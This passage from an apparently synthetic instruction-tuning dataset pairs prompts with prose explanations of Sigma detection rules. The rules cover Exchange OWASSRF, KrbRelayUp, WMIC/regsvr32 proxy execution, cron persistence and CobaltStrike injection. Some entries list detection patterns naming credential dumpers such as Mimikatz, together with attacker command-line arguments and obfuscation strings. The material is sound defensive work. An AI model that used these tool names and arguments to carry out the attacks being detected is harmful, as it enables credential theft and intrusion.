      "question": "usage of utilities such as 'systemctl', 'service'...etc to stop or disable tools and services",
      "answer": "In order to detect the usage of utilities such as 'systemctl', 'service'...etc to stop or disable tools and services, you should: focus on monitoring process creation events within Linux systems. Specifically, watch for processes that are being initiated whose image names end with '/service', '/systemctl', or '/chkconfig'. Furthermore, scrutinize the command line arguments of these processes for the presence of strings such as 'stop' or 'disable', which indicate an attempt to halt or deactivate certain system services or tools. Be mindful, however, that such activities could also originate from legitimate administration tasks. This detection operates at a medium severity level, suggesting a balanced approach to alerting to avoid overwhelming security personnel with false positives."
    }
  },
  {
    "instruction": "Please help me detect the following:  when a firewall rule is modified or deleted in Google Cloud Platform (GCP).",
    "context": "",
    "output": "Sure!\nIn order to detect when a firewall rule is modified or deleted in Google Cloud Platform (GCP), you should monitor the Google Cloud Platform's audit logs, specifically within the GCP audit service. Look for the following method names indicating modifications to firewall rules: `v*.Compute.Firewalls.Delete`, `v*.Compute.Firewalls.Patch`, `v*.Compute.Firewalls.Update`, and `v*.Compute.Firewalls.Insert`. These activities represent the deletion, patching, updating, or insertion of firewall rules, respectively. It's significant to interpret these logs accurately because changes to firewall rules could potentially expose vulnerabilities or compromise the protected network infrastructure, possibly leading to unauthorized access.\n\nBe aware that modifications to firewall rules might originate from legitimate administrative actions. Therefore, it's crucial to verify whether any detected modification or deletion of a firewall rule was expected or authorized. This verification process can help in distinguishing between ordinary maintenance activities and potential security incidents. In cases where certain activities are identified as routine or expected, exceptions can be incorporated to refine the monitoring process, helping to reduce false positive alerts.\n\nThis monitoring strategy has a medium level of urgency, indicating that while modifications to firewall rules are significant, they may not always represent an immediate threat to the organization's security posture. However, given the potential impact of unauthorized changes to firewall rules, such activities should be closely scrutinized and investigated promptly to ensure the security and integrity of the Google Cloud Platform environment.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": " when a firewall rule is modified or deleted in Google Cloud Platform (GCP).",
      "answer": "In order to detect when a firewall rule is modified or deleted in Google Cloud Platform (GCP), you should monitor the Google Cloud Platform's audit logs, specifically within the GCP audit service. Look for the following method names indicating modifications to firewall rules: `v*.Compute.Firewalls.Delete`, `v*.Compute.Firewalls.Patch`, `v*.Compute.Firewalls.Update`, and `v*.Compute.Firewalls.Insert`. These activities represent the deletion, patching, updating, or insertion of firewall rules, respectively. It's significant to interpret these logs accurately because changes to firewall rules could potentially expose vulnerabilities or compromise the protected network infrastructure, possibly leading to unauthorized access.\n\nBe aware that modifications to firewall rules might originate from legitimate administrative actions. Therefore, it's crucial to verify whether any detected modification or deletion of a firewall rule was expected or authorized. This verification process can help in distinguishing between ordinary maintenance activities and potential security incidents. In cases where certain activities are identified as routine or expected, exceptions can be incorporated to refine the monitoring process, helping to reduce false positive alerts.\n\nThis monitoring strategy has a medium level of urgency, indicating that while modifications to firewall rules are significant, they may not always represent an immediate threat to the organization's security posture. However, given the potential impact of unauthorized changes to firewall rules, such activities should be closely scrutinized and investigated promptly to ensure the security and integrity of the Google Cloud Platform environment."
    }
  },
  {
    "instruction": "How to detect: exploitation attempt of the OWASSRF variant targeting exchange servers using publicly available POC. It uses the OWA endpoint to access the powershell backend endpoint",
    "context": "",
    "output": "In order to detect exploitation attempt of the OWASSRF variant targeting exchange servers using publicly available POC. It uses the OWA endpoint to access the powershell backend endpoint, you should: Monitor web server logs for specific patterns that could indicate an attack. Look within the webserver category for instances where the cs-user-agent matches Mozilla/5.0 compatible with Windows NT 10.0 and acting as Chrome 105.0.5195.54 Safari/537.36. These requests should also be using the 'POST' method and returning a status code of 200, indicating a successful request. Crucially, the URI query should contain both '/owa/mastermailbox' and '/powershell' in the same request. This combination of criteria helps identify potential malicious activity aimed at exploiting the exchange server by leveraging the OWA interface to interact with PowerShell endpoints. False positives for this detection strategy are unlikely, indicating a high level of confidence in the specificity of this detection method for identifying potential exploits. The criticality of these detections points to the urgency and importance of monitoring for these specific conditions as part of a comprehensive cybersecurity defense strategy against attacks targeting exchange servers through the OWA interface.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "exploitation attempt of the OWASSRF variant targeting exchange servers using publicly available POC. It uses the OWA endpoint to access the powershell backend endpoint",
      "answer": "In order to detect exploitation attempt of the OWASSRF variant targeting exchange servers using publicly available POC. It uses the OWA endpoint to access the powershell backend endpoint, you should: Monitor web server logs for specific patterns that could indicate an attack. Look within the webserver category for instances where the cs-user-agent matches Mozilla/5.0 compatible with Windows NT 10.0 and acting as Chrome 105.0.5195.54 Safari/537.36. These requests should also be using the 'POST' method and returning a status code of 200, indicating a successful request. Crucially, the URI query should contain both '/owa/mastermailbox' and '/powershell' in the same request. This combination of criteria helps identify potential malicious activity aimed at exploiting the exchange server by leveraging the OWA interface to interact with PowerShell endpoints. False positives for this detection strategy are unlikely, indicating a high level of confidence in the specificity of this detection method for identifying potential exploits. The criticality of these detections points to the urgency and importance of monitoring for these specific conditions as part of a comprehensive cybersecurity defense strategy against attacks targeting exchange servers through the OWA interface."
    }
  },
  {
    "instruction": "Explain how should I detect the following: KrbRelayUp used to perform a universal no-fix local privilege escalation in Windows domain environments where LDAP signing is not enforced",
    "context": "",
    "output": "In order to detect KrbRelayUp used to perform a universal no-fix local privilege escalation in Windows domain environments where LDAP signing is not enforced, you should monitor process creation logs on Windows systems for specific indicators of this attack. Look for the execution of a file named 'KrbRelayUp.exe' or any file originally named 'KrbRelayUp.exe' even if it has been renamed after compilation. Additionally, pay attention to command-line arguments that are indicative of this attack method. The relevant arguments to watch for include any process creation events that combine 'relay' with '-Domain' and '-ComputerName', which shows an attempt to specify domain and computer targets for the attack. Also, command lines containing 'krbscm' with '-sc' indicate an attempt to manipulate Kerberos service tickets, while those combining 'spawn' with '-d', '-cn', and '-cp' arguments suggest an effort to spawn a process with elevated privileges in the domain context. Monitoring for these signs with a high level of scrutiny is crucial as false positives are unlikely, indicating that detection of these patterns is a strong indicator of an ongoing attack leveraging the KrbRelayUp technique for escalating privileges without a current fix.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "KrbRelayUp used to perform a universal no-fix local privilege escalation in Windows domain environments where LDAP signing is not enforced",
      "answer": "In order to detect KrbRelayUp used to perform a universal no-fix local privilege escalation in Windows domain environments where LDAP signing is not enforced, you should monitor process creation logs on Windows systems for specific indicators of this attack. Look for the execution of a file named 'KrbRelayUp.exe' or any file originally named 'KrbRelayUp.exe' even if it has been renamed after compilation. Additionally, pay attention to command-line arguments that are indicative of this attack method. The relevant arguments to watch for include any process creation events that combine 'relay' with '-Domain' and '-ComputerName', which shows an attempt to specify domain and computer targets for the attack. Also, command lines containing 'krbscm' with '-sc' indicate an attempt to manipulate Kerberos service tickets, while those combining 'spawn' with '-d', '-cn', and '-cp' arguments suggest an effort to spawn a process with elevated privileges in the domain context. Monitoring for these signs with a high level of scrutiny is crucial as false positives are unlikely, indicating that detection of these patterns is a strong indicator of an ongoing attack leveraging the KrbRelayUp technique for escalating privileges without a current fix."
    }
  },
  {
    "instruction": "Can you explain how to detect: potential commandline obfuscation using known escape characters",
    "context": "",
    "output": "Certainly!\n\nIn order to detect potential commandline obfuscation using known escape characters, you should: monitor process creation logs on Windows systems for commands that attempt to obscure the presence of \"http\" in their command line by using known escape characters. Specifically, look for instances where \"http\" is disguised with caret (^) symbols between each letter, as in \"h^t^t^p\", or double quotes (\") around each letter, as in \"h\"t\"t\"p\". Such techniques may indicate an effort to evade detection mechanisms by obfuscating URLs or commands. Be aware that there might be unknown scenarios that could trigger false positives, however, these should be investigated with a medium level of urgency to ensure they're not actual threats.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "potential commandline obfuscation using known escape characters",
      "answer": "In order to detect potential commandline obfuscation using known escape characters, you should: monitor process creation logs on Windows systems for commands that attempt to obscure the presence of \"http\" in their command line by using known escape characters. Specifically, look for instances where \"http\" is disguised with caret (^) symbols between each letter, as in \"h^t^t^p\", or double quotes (\") around each letter, as in \"h\"t\"t\"p\". Such techniques may indicate an effort to evade detection mechanisms by obfuscating URLs or commands. Be aware that there might be unknown scenarios that could trigger false positives, however, these should be investigated with a medium level of urgency to ensure they're not actual threats."
    }
  },
  {
    "instruction": "Please help me detect the following: Excel called wmic to finally proxy execute regsvr32 with the payload.\nAn attacker wanted to break suspicious parent-child chain (Office app spawns LOLBin).\nBut we have command-line in the event which allow us to \"restore\" this suspicious parent-child chain and detect it.\nMonitor process creation with \"wmic process call create\" and LOLBins in command-line with parent Office application processes.\n",
    "context": "",
    "output": "Sure!\nIn order to monitor an attacker's attempt to execute a payload using regsvr32 by breaking a suspicious parent-child chain (where an Office application spawns a Living Off The Land Binary or LOLBin) and to detect it by restoring this suspicious link through command-line events, you should:\n\nFocus on monitoring Windows process creation logs. Specifically, lookout for instances where wmics.exe (either via its image path ending with '\\wbem\\WMIC.exe' or by its original filename 'wmic.exe') is executed. Additionally, pay attention to other command-line instances containing execution commands for known LOLBins such as 'regsvr32', 'rundll32', 'msiexec', 'mshta', and 'verclsid'. Importantly, this rule also involves checking for command-lines that contain the specific pattern of creating a process by using 'wmic process call create', indicative of suspicious activity when combined with other factors. \n\nFurthermore, the detection mechanism must assess the parent process image to identify if any of these commands originate from an Office application, specifically looking for parent processes like 'winword.exe' (Word), 'excel.exe' (Excel), or 'powerpnt.exe' (PowerPoint). This helps reconstruct and identify suspicious parent-child process chains where an Office application might be initiating a potentially malicious process indirectly.\n\nThis monitoring strategy aims at catching high-level malicious activities with a focus on known attack techniques involving Office applications and LOLBins without unnecessary false positive alerts. This is critical for identifying sophisticated attacks where adversaries use legitimate system tools for malicious purposes, thereby blending in with normal system operations.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Excel called wmic to finally proxy execute regsvr32 with the payload.\nAn attacker wanted to break suspicious parent-child chain (Office app spawns LOLBin).\nBut we have command-line in the event which allow us to \"restore\" this suspicious parent-child chain and detect it.\nMonitor process creation with \"wmic process call create\" and LOLBins in command-line with parent Office application processes.\n",
      "answer": "In order to monitor an attacker's attempt to execute a payload using regsvr32 by breaking a suspicious parent-child chain (where an Office application spawns a Living Off The Land Binary or LOLBin) and to detect it by restoring this suspicious link through command-line events, you should:\n\nFocus on monitoring Windows process creation logs. Specifically, lookout for instances where wmics.exe (either via its image path ending with '\\wbem\\WMIC.exe' or by its original filename 'wmic.exe') is executed. Additionally, pay attention to other command-line instances containing execution commands for known LOLBins such as 'regsvr32', 'rundll32', 'msiexec', 'mshta', and 'verclsid'. Importantly, this rule also involves checking for command-lines that contain the specific pattern of creating a process by using 'wmic process call create', indicative of suspicious activity when combined with other factors. \n\nFurthermore, the detection mechanism must assess the parent process image to identify if any of these commands originate from an Office application, specifically looking for parent processes like 'winword.exe' (Word), 'excel.exe' (Excel), or 'powerpnt.exe' (PowerPoint). This helps reconstruct and identify suspicious parent-child process chains where an Office application might be initiating a potentially malicious process indirectly.\n\nThis monitoring strategy aims at catching high-level malicious activities with a focus on known attack techniques involving Office applications and LOLBins without unnecessary false positive alerts. This is critical for identifying sophisticated attacks where adversaries use legitimate system tools for malicious purposes, thereby blending in with normal system operations."
    }
  },
  {
    "instruction": "How to detect: process start from rare or uncommon folders like temporary folder or folders that usually don't contain executable files",
    "context": "",
    "output": "In order to detect process start from rare or uncommon folders like temporary folder or folders that usually don't contain executable files, you should: monitor for processes being started from certain directories on Windows systems that are typically not used to store or execute programs. Specifically, be vigilant for any executable starting from paths containing '\\Desktop\\', '\\Temp\\', or '\\Temporary Internet'. However, it's important to exclude from alerts the instances where the parent process of these potentially suspicious executables is known and trusted system or software processes, such as 'C:\\Windows\\System32\\cleanmgr.exe', 'C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\resources\\app\\ServiceHub\\Services\\Microsoft.VisualStudio.Setup.Service\\BackgroundDownload.exe', 'C:\\Windows\\System32\\dxgiadaptercache.exe', or those starting with 'C:\\Program Files (x86)\\NVIDIA Corporation\\'. Additionally, executables that end with 'setup.exe', especially those not initiating from system-designated temporary directories, need careful observation for irregularities. Also, pay close attention to executables initiating from 'C:\\Program Files (x86)\\Microsoft\\Temp\\' or ending with '.tmp\\MicrosoftEdgeUpdate.exe' to mitigate the risk of overlooking potentially malicious activity disguised under temporary or updating processes. This process should be approached with an understanding that installers running from common temporary directories such as \"AppData\\Local\\Temp\" and \"C:\\Windows\\Temp\\\" are usually benign and can be considered as expected behavior, thus tagged with a lower severity level.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "process start from rare or uncommon folders like temporary folder or folders that usually don't contain executable files",
      "answer": "In order to detect process start from rare or uncommon folders like temporary folder or folders that usually don't contain executable files, you should: monitor for processes being started from certain directories on Windows systems that are typically not used to store or execute programs. Specifically, be vigilant for any executable starting from paths containing '\\Desktop\\', '\\Temp\\', or '\\Temporary Internet'. However, it's important to exclude from alerts the instances where the parent process of these potentially suspicious executables is known and trusted system or software processes, such as 'C:\\Windows\\System32\\cleanmgr.exe', 'C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer\\resources\\app\\ServiceHub\\Services\\Microsoft.VisualStudio.Setup.Service\\BackgroundDownload.exe', 'C:\\Windows\\System32\\dxgiadaptercache.exe', or those starting with 'C:\\Program Files (x86)\\NVIDIA Corporation\\'. Additionally, executables that end with 'setup.exe', especially those not initiating from system-designated temporary directories, need careful observation for irregularities. Also, pay close attention to executables initiating from 'C:\\Program Files (x86)\\Microsoft\\Temp\\' or ending with '.tmp\\MicrosoftEdgeUpdate.exe' to mitigate the risk of overlooking potentially malicious activity disguised under temporary or updating processes. This process should be approached with an understanding that installers running from common temporary directories such as \"AppData\\Local\\Temp\" and \"C:\\Windows\\Temp\\\" are usually benign and can be considered as expected behavior, thus tagged with a lower severity level."
    }
  },
  {
    "instruction": "Explain how should I detect the following: creation of cron file or files in Cron directories which could indicates potential persistence.",
    "context": "",
    "output": "In order to detect the creation of cron files or files in Cron directories, which could indicate potential persistence, you should: Monitor Linux systems for file events, specifically the creation or modification of files within critical cron directories such as `/etc/cron.d/`, `/etc/cron.daily/`, `/etc/cron.hourly/`, `/etc/cron.monthly/`, and `/etc/cron.weekly/`, as well as in `/var/spool/cron/crontabs/`. Additionally, keep an eye on changes to files like `/etc/cron.allow`, `/etc/cron.deny`, and `/etc/crontab`. These activities should raise alerts as they can be indicative of an attacker establishing a means to execute malicious tasks on a recurring basis, which is a common technique for achieving persistence on a compromised system. Be aware that there could be legitimate reasons for such file events, so it's important to investigate these alerts to differentiate between benign and malicious activities. This approach aligns with the monitoring of Persistence and Execution techniques as outlined in the MITRE ATT&CK framework, providing a medium-level alert indicative of potential malicious activity.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "creation of cron file or files in Cron directories which could indicates potential persistence.",
      "answer": "In order to detect the creation of cron files or files in Cron directories, which could indicate potential persistence, you should: Monitor Linux systems for file events, specifically the creation or modification of files within critical cron directories such as `/etc/cron.d/`, `/etc/cron.daily/`, `/etc/cron.hourly/`, `/etc/cron.monthly/`, and `/etc/cron.weekly/`, as well as in `/var/spool/cron/crontabs/`. Additionally, keep an eye on changes to files like `/etc/cron.allow`, `/etc/cron.deny`, and `/etc/crontab`. These activities should raise alerts as they can be indicative of an attacker establishing a means to execute malicious tasks on a recurring basis, which is a common technique for achieving persistence on a compromised system. Be aware that there could be legitimate reasons for such file events, so it's important to investigate these alerts to differentiate between benign and malicious activities. This approach aligns with the monitoring of Persistence and Execution techniques as outlined in the MITRE ATT&CK framework, providing a medium-level alert indicative of potential malicious activity."
    }
  },
  {
    "instruction": "Please help me detect the following: typical pattern of a CobaltStrike BOF which inject into other processes",
    "context": "",
    "output": "Sure!\nIn order to detect a typical pattern of a CobaltStrike Beacon Object File (BOF) which injects into other processes, you should monitor Windows process access logs for specific anomalies. Specifically, watch for instances where the call trace includes sequences that start with 'C:\\Windows\\SYSTEM32\\ntdll.dll', followed by a hexadecimal offset, or 'C:\\Windows\\System32\\KERNELBASE.dll', also followed by a hexadecimal offset, and ending with an 'UNKNOWN' sequence that contains a 16-character alphanumeric string. Additionally, scrutinize the 'GrantedAccess' fields for values '0x1028' or '0x1fffff', which represent particular access permissions of interest. This pattern is indicative of suspicious process injection activities commonly associated with CobaltStrike BOF executions, which can be part of privilege escalation, defense evasion, or credential access tactics.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "typical pattern of a CobaltStrike BOF which inject into other processes",
      "answer": "In order to detect a typical pattern of a CobaltStrike Beacon Object File (BOF) which injects into other processes, you should monitor Windows process access logs for specific anomalies. Specifically, watch for instances where the call trace includes sequences that start with 'C:\\Windows\\SYSTEM32\\ntdll.dll', followed by a hexadecimal offset, or 'C:\\Windows\\System32\\KERNELBASE.dll', also followed by a hexadecimal offset, and ending with an 'UNKNOWN' sequence that contains a 16-character alphanumeric string. Additionally, scrutinize the 'GrantedAccess' fields for values '0x1028' or '0x1fffff', which represent particular access permissions of interest. This pattern is indicative of suspicious process injection activities commonly associated with CobaltStrike BOF executions, which can be part of privilege escalation, defense evasion, or credential access tactics."
    }
  },
  {
    "instruction": "Can you explain how to detect: Detection of logins performed with WMI",
    "context": "",
    "output": "Certainly!\n\nIn order to detect logins performed with WMI, you should: Focus on monitoring Windows security logs for event ID 4624, which signifies a successful account logon event, specifically when the logon is performed via the WMI process, as indicated by the process name ending with '\\WmiPrvSE.exe'. It's important to note that while this activity can indicate a potential security concern, there might be false positives resulting from monitoring tools or legitimate system administration tasks, and the risk level associated with this detection is considered low.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Detection of logins performed with WMI",
      "answer": "In order to detect logins performed with WMI, you should: Focus on monitoring Windows security logs for event ID 4624, which signifies a successful account logon event, specifically when the logon is performed via the WMI process, as indicated by the process name ending with '\\WmiPrvSE.exe'. It's important to note that while this activity can indicate a potential security concern, there might be false positives resulting from monitoring tools or legitimate system administration tasks, and the risk level associated with this detection is considered low."
    }
  },
  {
    "instruction": "Please help me detect the following: use of the spoolss named pipe over SMB. This can be used to trigger the authentication via NTLM of any machine that has the spoolservice enabled.",
    "context": "",
    "output": "Sure!\nIn order to detect the use of the spoolss named pipe over SMB, which can be used to trigger the authentication via NTLM of any machine that has the spoolservice enabled, you should: \n\nMonitor Windows security event log for event ID 5145. This event ID is significant as it logs attempts to access shared objects over the network. Specifically, look for access attempts to the IPC$ share (`\\\\*\\IPC$`) where the `RelativeTargetName` involved is `spoolss`. The IPC$ share is a special administrative share that exists in all versions of Windows, used for inter-process communication (IPC), and accessing it with the intention of interacting with `spoolss` suggests an attempt to illicitly trigger NTLM authentication through the printer spooler service. \n\nBe aware that domain controllers that also serve as printer servers may legitimately access the `spoolss` named pipe over SMB, which can result in false positives. Thus, such activity should not be immediately considered malicious without further investigation. The security level for this kind of detection is medium, indicating a balanced approach towards potential threat detection and avoidance of excessive false positives. \n\nTagging this activity involves associating it with relevant MITRE ATT&CK tactics and techniques, which in this context would likely include \"Lateral Movement\" and \"Execution\" due to the nature of using SMB for execution or spreading within a network.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "use of the spoolss named pipe over SMB. This can be used to trigger the authentication via NTLM of any machine that has the spoolservice enabled.",
      "answer": "In order to detect the use of the spoolss named pipe over SMB, which can be used to trigger the authentication via NTLM of any machine that has the spoolservice enabled, you should: \n\nMonitor Windows security event log for event ID 5145. This event ID is significant as it logs attempts to access shared objects over the network. Specifically, look for access attempts to the IPC$ share (`\\\\*\\IPC$`) where the `RelativeTargetName` involved is `spoolss`. The IPC$ share is a special administrative share that exists in all versions of Windows, used for inter-process communication (IPC), and accessing it with the intention of interacting with `spoolss` suggests an attempt to illicitly trigger NTLM authentication through the printer spooler service. \n\nBe aware that domain controllers that also serve as printer servers may legitimately access the `spoolss` named pipe over SMB, which can result in false positives. Thus, such activity should not be immediately considered malicious without further investigation. The security level for this kind of detection is medium, indicating a balanced approach towards potential threat detection and avoidance of excessive false positives. \n\nTagging this activity involves associating it with relevant MITRE ATT&CK tactics and techniques, which in this context would likely include \"Lateral Movement\" and \"Execution\" due to the nature of using SMB for execution or spreading within a network."
    }
  },
  {
    "instruction": "Can you explain how to detect: creation of a remote thread from a Powershell process to another process",
    "context": "",
    "output": "Certainly!\n\nIn order to detect the creation of a remote thread from a Powershell process to another process, you should focus on monitoring Windows environments, particularly looking at events that indicate the creation of remote threads. Pay special attention to events where the source of the remote thread creation stems from either a Powershell executable (`powershell.exe`) or the newer PowerShell Core executable (`pwsh.exe`). This is critical because legitimate tools like these are often leveraged by attackers for malicious purposes due to their powerful capabilities and widespread availability on Windows systems.\n\nHowever, it's important to apply a specific filter to reduce false positives. Specifically, exclude any events where the parent process creating the thread is `C:\\Windows\\System32\\CompatTelRunner.exe`. This is because `CompatTelRunner.exe` is a legitimate Windows component used in compatibility assessments, which could sometimes perform operations resembling malicious behavior but are indeed benign.\n\nWhile the possibility of unknown false positives exists, given the broad nature of PowerShell\u2019s use in both legitimate and malicious activities, the detection should be considered of medium severity due to the potential for abuse in executing code or scripts that can lead to system compromise, data theft, or other unauthorized activities.\n\nMonitoring for such activities is essential for identifying potential indicators of compromise related to various tactics and techniques, notably those associated with execution and defense evasion. By keeping an eye on these specific event patterns, analysts can more effectively spot signs of malicious PowerShell use, which might indicate a broader attack strategy being employed against the network.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "creation of a remote thread from a Powershell process to another process",
      "answer": "In order to detect the creation of a remote thread from a Powershell process to another process, you should focus on monitoring Windows environments, particularly looking at events that indicate the creation of remote threads. Pay special attention to events where the source of the remote thread creation stems from either a Powershell executable (`powershell.exe`) or the newer PowerShell Core executable (`pwsh.exe`). This is critical because legitimate tools like these are often leveraged by attackers for malicious purposes due to their powerful capabilities and widespread availability on Windows systems.\n\nHowever, it's important to apply a specific filter to reduce false positives. Specifically, exclude any events where the parent process creating the thread is `C:\\Windows\\System32\\CompatTelRunner.exe`. This is because `CompatTelRunner.exe` is a legitimate Windows component used in compatibility assessments, which could sometimes perform operations resembling malicious behavior but are indeed benign.\n\nWhile the possibility of unknown false positives exists, given the broad nature of PowerShell\u2019s use in both legitimate and malicious activities, the detection should be considered of medium severity due to the potential for abuse in executing code or scripts that can lead to system compromise, data theft, or other unauthorized activities.\n\nMonitoring for such activities is essential for identifying potential indicators of compromise related to various tactics and techniques, notably those associated with execution and defense evasion. By keeping an eye on these specific event patterns, analysts can more effectively spot signs of malicious PowerShell use, which might indicate a broader attack strategy being employed against the network."
    }
  },
  {
    "instruction": "How can I detect: highly relevant Antivirus alert that reports a password dumper",
    "context": "",
    "output": "In order to detect a highly relevant Antivirus alert that reports a password dumper, you should monitor antivirus logs for alerts that report the usage of password dumper tools. Specifically, look for signatures that start with 'PWS' or contain specific keywords indicative of well-known password dumping utilities such as 'DumpCreds', 'Mimikatz', 'PWCrack', 'HTool/WCE', 'PSWTool', 'PWDump', 'SecurityTool', 'PShlSpy', 'Rubeus', 'Kekeo', 'LsassDump', 'Outflank', 'DumpLsass', 'SharpDump', 'PWSX', or 'PWS.'. These signatures are associated with tools and techniques designed to extract or manipulate passwords from systems or software, indicating a potential security threat.\n\nTo effectively detect such activities, focus on any alert generated by the antivirus under the specified conditions. The information most relevant to understanding the extent and specifics of the detection includes the file name involved in the detection and the user account under which the activity was initiated.\n\nDue to the critical nature of password dumpers in enabling further unauthorized access and lateral movement within a network, alerts fitting these criteria are considered critically important. However, false positives are unlikely, suggesting that any detection should be taken seriously and investigated promptly.\n\nBy focusing on these specific signature patterns and tool indicators, organizations can identify attempts to compromise credentials, aiding in the quick response to mitigate potential damage or unauthorized access.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "highly relevant Antivirus alert that reports a password dumper",
      "answer": "In order to detect a highly relevant Antivirus alert that reports a password dumper, you should monitor antivirus logs for alerts that report the usage of password dumper tools. Specifically, look for signatures that start with 'PWS' or contain specific keywords indicative of well-known password dumping utilities such as 'DumpCreds', 'Mimikatz', 'PWCrack', 'HTool/WCE', 'PSWTool', 'PWDump', 'SecurityTool', 'PShlSpy', 'Rubeus', 'Kekeo', 'LsassDump', 'Outflank', 'DumpLsass', 'SharpDump', 'PWSX', or 'PWS.'. These signatures are associated with tools and techniques designed to extract or manipulate passwords from systems or software, indicating a potential security threat.\n\nTo effectively detect such activities, focus on any alert generated by the antivirus under the specified conditions. The information most relevant to understanding the extent and specifics of the detection includes the file name involved in the detection and the user account under which the activity was initiated.\n\nDue to the critical nature of password dumpers in enabling further unauthorized access and lateral movement within a network, alerts fitting these criteria are considered critically important. However, false positives are unlikely, suggesting that any detection should be taken seriously and investigated promptly.\n\nBy focusing on these specific signature patterns and tool indicators, organizations can identify attempts to compromise credentials, aiding in the quick response to mitigate potential damage or unauthorized access."
    }
  },
  {
    "instruction": "Explain how should I detect the following: blocked attempts to change any of Defender's settings such as \"Real Time Monitoring\" and \"Behavior Monitoring\"",
    "context": "",
    "output": "In order to detect blocked attempts to change any of Defender's settings such as \"Real Time Monitoring\" and \"Behavior Monitoring\", you should monitor Windows Defender (WinDefend) logs for Event ID 5013. This event is triggered when tamper protection blocks an attempt to modify Microsoft Defender Antivirus settings. Specifically, look for modifications attempts targeting key Defender settings, including disabling anti-spyware, anti-virus, archive scanning, scanning of network files, real-time monitoring, behavior monitoring, inbound attack protection (IOAV), and script scanning. These modifications are typically indicated by the event detailing which setting change was blocked and can end with specific registry key paths such as '\\Windows Defender\\DisableAntiSpyware', '\\Windows Defender\\DisableAntiVirus', and several others related to real-time protection and scanning options.\n\nIt's essential to be aware that there might be legitimate reasons, such as administrative testing, for these settings to be changed. However, such actions must be investigated to ensure they are not malicious attempts to weaken the system's defenses. Tampering attempts are categorized under high severity due to their potential to disable critical security measures, facilitating further malicious activities. Detection of these alterations assists in defending against tactics and techniques associated with Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, and Discovery.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "blocked attempts to change any of Defender's settings such as \"Real Time Monitoring\" and \"Behavior Monitoring\"",
      "answer": "In order to detect blocked attempts to change any of Defender's settings such as \"Real Time Monitoring\" and \"Behavior Monitoring\", you should monitor Windows Defender (WinDefend) logs for Event ID 5013. This event is triggered when tamper protection blocks an attempt to modify Microsoft Defender Antivirus settings. Specifically, look for modifications attempts targeting key Defender settings, including disabling anti-spyware, anti-virus, archive scanning, scanning of network files, real-time monitoring, behavior monitoring, inbound attack protection (IOAV), and script scanning. These modifications are typically indicated by the event detailing which setting change was blocked and can end with specific registry key paths such as '\\Windows Defender\\DisableAntiSpyware', '\\Windows Defender\\DisableAntiVirus', and several others related to real-time protection and scanning options.\n\nIt's essential to be aware that there might be legitimate reasons, such as administrative testing, for these settings to be changed. However, such actions must be investigated to ensure they are not malicious attempts to weaken the system's defenses. Tampering attempts are categorized under high severity due to their potential to disable critical security measures, facilitating further malicious activities. Detection of these alterations assists in defending against tactics and techniques associated with Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, and Discovery."
    }
  },
  {
    "instruction": "How can I detect: Obfuscated Powershell via use MSHTA in Scripts",
    "context": "",
    "output": "In order to Detect Obfuscated Powershell via use MSHTA in Scripts, you should: Monitor Windows drivers loading for any instances where the ImagePath contains a specific sequence of elements indicating a potential attempt at obfuscation. Specifically, lookout for the simultaneous presence of 'set', '&&', 'mshta', 'vbscript:createobject', '.run', and '(window.close)' within the ImagePath. This pattern might suggest an attempt to execute PowerShell scripts in a manner designed to evade detection. This detection is critical due to its high severity level, and while there may be unknown false positives, the absence of known benign use-cases for this precise combination of elements underscores its importance. The relevant tactics and techniques from the MITRE ATT&CK framework associated with this activity include Defense Evasion and Execution, specifically identified as Obfuscated Files or Information (T1027) and Command and Scripting Interpreter: PowerShell (T1059.001).",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Obfuscated Powershell via use MSHTA in Scripts",
      "answer": "In order to Detect Obfuscated Powershell via use MSHTA in Scripts, you should: Monitor Windows drivers loading for any instances where the ImagePath contains a specific sequence of elements indicating a potential attempt at obfuscation. Specifically, lookout for the simultaneous presence of 'set', '&&', 'mshta', 'vbscript:createobject', '.run', and '(window.close)' within the ImagePath. This pattern might suggest an attempt to execute PowerShell scripts in a manner designed to evade detection. This detection is critical due to its high severity level, and while there may be unknown false positives, the absence of known benign use-cases for this precise combination of elements underscores its importance. The relevant tactics and techniques from the MITRE ATT&CK framework associated with this activity include Defense Evasion and Execution, specifically identified as Obfuscated Files or Information (T1027) and Command and Scripting Interpreter: PowerShell (T1059.001)."
    }
  },
  {
    "instruction": "How can I detect: suspicious execution from an uncommon folder",
    "context": "",
